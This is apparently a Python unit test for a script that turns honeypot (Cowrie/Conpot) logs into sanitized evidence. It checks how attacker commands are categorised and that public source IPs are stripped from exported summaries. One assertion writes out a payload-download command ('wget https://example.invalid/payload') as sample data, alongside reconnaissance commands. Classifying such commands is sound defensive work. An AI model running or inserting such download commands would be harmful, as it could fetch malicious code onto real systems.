from __future__ import annotations

import csv
import json
import tempfile
import unittest
from pathlib import Path

from scripts.build_evidence import HEADER_ORDER, build, command_category


def write_csv(path: Path, headers: list[str], rows: list[list[object]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle)
        writer.writerow(headers)
        writer.writerows(rows)


class EvidenceBuilderTest(unittest.TestCase):
    def test_command_categories(self) -> None:
        self.assertEqual(command_category("uname -a"), "host_discovery")
        self.assertEqual(command_category("wget https://example.invalid/payload"), "payload_transfer")
        self.assertEqual(command_category("chmod +x sample"), "permission_change")

    def test_builds_sanitized_outputs_and_excludes_non_global_source(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            inputs = root / "inputs"
            outputs = root / "outputs"
            inputs.mkdir()

            write_csv(inputs / "master_dataset.csv", HEADER_ORDER["master_dataset.csv"], [
                ["2026-04-23T03:29:50Z", "Cowrie", "1.1.1.1", "cowrie.login.success", "cowrie.login.success"],
            ])
            write_csv(inputs / "cross_targeting.csv", HEADER_ORDER["cross_targeting.csv"], [
                ["1.1.1.1", "2", "Conpot Cowrie", "3"],
            ])
            write_csv(inputs / "high_severity.csv", HEADER_ORDER["high_severity.csv"], [
                ["2026-04-23T03:29:50Z", "cowrie", "cowrie.login.success"],
                ["2026-04-23T03:30:50Z", "cowrie", "cowrie.command.input"],
            ])
            write_csv(inputs / "ics_activity.csv", HEADER_ORDER["ics_activity.csv"], [
                ["2026-04-23T03:31:50Z", "S7 request"],
            ])
            write_csv(inputs / "cowrie_commands.csv", HEADER_ORDER["cowrie_commands.csv"], [
                ["uname -a", "2"],
            ])
            write_csv(inputs / "attacker_summary.csv", HEADER_ORDER["attacker_summary.csv"], [
                ["1.1.1.1", "10", "2", "Conpot Cowrie"],
                ["127.0.0.1", "2", "1", "Cowrie"],
            ])

            build(inputs, outputs)
            metrics = json.loads((outputs / "metrics.json").read_text(encoding="utf-8"))
            self.assertEqual(metrics["aggregate_export"]["unique_source_values"], 2)
            self.assertEqual(metrics["aggregate_export"]["globally_routable_sources"], 1)
            self.assertEqual(metrics["aggregate_export"]["non_global_sources"], 1)
            self.assertNotIn("1.1.1.1", (outputs / "attacker_summary_sanitized.csv").read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
